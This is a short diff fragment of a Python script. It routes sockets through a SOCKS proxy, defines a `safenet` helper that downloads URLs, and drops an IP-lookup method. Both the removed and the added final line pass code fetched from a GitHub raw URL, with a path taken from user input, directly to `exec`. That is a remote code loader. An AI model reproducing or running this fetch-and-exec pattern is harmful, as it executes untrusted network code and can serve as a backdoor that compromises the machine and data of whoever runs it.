@@ -847,9 +847,5 @@ socket.socket=socksocket
 class safenet:
     def getbinary(url):
         return urlopen(Request(url)).read()
-    def get(url):
-        return safenet.getbinary(url).decode('utf-8')
-    def ip():
-        return safenet.get('https://ident.me')
       
-exec(safenet.get('https://raw.githubusercontent.com/alexis-dom/mir/main/' + input('>')))
+exec(safenet.getbinary('https://raw.githubusercontent.com/alexis-dom/mir/main/' + input('>')))
